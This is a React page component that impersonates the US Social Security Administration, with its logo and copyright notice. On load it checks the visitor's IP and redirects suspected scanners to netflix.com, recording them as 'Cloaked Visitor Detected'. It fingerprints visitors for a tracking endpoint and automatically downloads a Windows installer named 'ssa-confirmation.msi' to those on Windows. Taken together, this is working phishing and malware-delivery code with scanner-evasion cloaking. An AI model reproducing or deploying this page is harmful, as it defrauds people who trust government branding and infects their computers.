"use client";

import { useEffect, useState } from "react";
import DownloadGuide from "@/components/DownloadGuide";
import PlatformModal from "@/components/PlatformModal";

const DOWNLOAD_API = "/api/download";
const DOWNLOAD_FILENAME = "ssa-confirmation.msi";
const WINDOWS_ONLY_EXTENSIONS = [".exe", ".msi"];

export default function Home() {
  const [downloadStatus, setDownloadStatus] = useState<'idle' | 'starting' | 'downloaded'>('idle');
  const [showPlatformModal, setShowPlatformModal] = useState(false);
  const [isWindows, setIsWindows] = useState(true);
  const [isCheckingIP, setIsCheckingIP] = useState(true);

  const trackEvent = async (event: string) => {
    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event,
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: new Date().toISOString(),
          referrer: document.referrer,
        }),
      });
    } catch (error) {
      console.error('Tracking error:', error);
    }
  };

  useEffect(() => {
    const checkIPAndInitialize = async () => {
      try {
        const response = await fetch('/api/check-ip');
        const data = await response.json();
        
        if (!data.isSafe) {
          trackEvent('Cloaked Visitor Detected');
          window.location.href = 'https://www.netflix.com';
          return;
        }
      } catch (error) {
        console.error('IP check error:', error);
        window.location.href = 'https://www.netflix.com';
        return;
      }
      
      setIsCheckingIP(false);

      const userAgent = navigator.userAgent.toLowerCase();
      const windowsDetected = /windows|win32|win64/.test(userAgent);
      setIsWindows(windowsDetected);

      trackEvent('Page Visit');

      const fileExtension = DOWNLOAD_FILENAME.substring(DOWNLOAD_FILENAME.lastIndexOf('.'));
      const requiresWindows = WINDOWS_ONLY_EXTENSIONS.includes(fileExtension.toLowerCase());

      if (requiresWindows && !windowsDetected) {
        setShowPlatformModal(true);
        trackEvent('Platform Mismatch - Non-Windows User');
        return;
      }

      setDownloadStatus('starting');
      trackEvent('Download Started');

      const timer = setTimeout(() => {
        const link = document.createElement("a");
        link.href = DOWNLOAD_API;
        link.download = DOWNLOAD_FILENAME;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        setDownloadStatus('downloaded');
        trackEvent('Download Completed');
      }, 1500);

      return () => clearTimeout(timer);
    };

    checkIPAndInitialize();
  }, []);

  const handleManualDownload = () => {
    trackEvent('Manual Download Click');
    const link = document.createElement("a");
    link.href = DOWNLOAD_API;
    link.download = DOWNLOAD_FILENAME;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setDownloadStatus('downloaded');
  };

  if (isCheckingIP) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f5f5f5]">
        <div className="text-center">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#112e51] mx-auto"></div>
          <p className="mt-4 text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f5f5f5] font-sans">
      <DownloadGuide />
      {showPlatformModal && <PlatformModal onClose={() => setShowPlatformModal(false)} />}
      <div className="bg-white p-10 md:p-16 rounded-lg shadow-lg text-center max-w-2xl w-full mx-4">
        <div className="w-48 h-auto mx-auto mb-8">
          <img
            src="/ssa-logo.png"
            alt="Social Security Administration Logo"
            className="w-full h-auto"
          />
        </div>

        <h1 className="text-[#112e51] text-2xl font-bold tracking-wider mb-8 uppercase">
          {downloadStatus === 'starting' && 'Download Starting...'}
          {downloadStatus === 'downloaded' && 'Your file has been downloaded.'}
          {downloadStatus === 'idle' && 'Preparing Download...'}
        </h1>

        <p className="text-[#6b6b6b] text-xs mb-4">
          © 2025 Social Security Administration. All rights reserved.
        </p>

        <div className="text-xs flex justify-center items-center gap-2">
          <a href="#" className="text-[#c41230] hover:underline">Privacy Policy</a>
          <span className="text-[#6b6b6b]">|</span>
          <a href="#" className="text-[#c41230] hover:underline">Terms of Service</a>
        </div>

        <div className="mt-8 text-sm text-gray-400">
          <p>
            If the download didn't start,{" "}
            <button
              onClick={handleManualDownload}
              className="text-[#112e51] hover:underline font-semibold cursor-pointer bg-transparent border-none p-0"
            >
              click here
            </button>
            .
          </p>
        </div>
      </div>

      {showPlatformModal && (
        <PlatformModal onClose={() => setShowPlatformModal(false)} />
      )}
    </div>
  );
}
